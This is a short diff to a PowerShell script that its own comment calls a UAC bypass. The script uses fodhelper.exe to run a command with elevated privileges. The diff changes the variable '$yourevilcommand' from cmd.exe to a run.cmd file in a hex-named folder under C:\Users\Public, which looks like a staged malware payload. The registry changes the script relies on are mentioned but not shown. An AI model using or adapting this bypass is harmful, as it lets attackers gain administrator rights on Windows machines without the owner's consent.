@@ -1,6 +1,6 @@
 #This UAC bypass tries to execute your command with elevated privileges using fodhelper.exe
 
-$yourevilcommand = "C:\Windows\System32\cmd.exe"
+$yourevilcommand = "C:\Users\Public\150F4013\run.cmd"
 
 #Adding all the reistry required with your command.
 
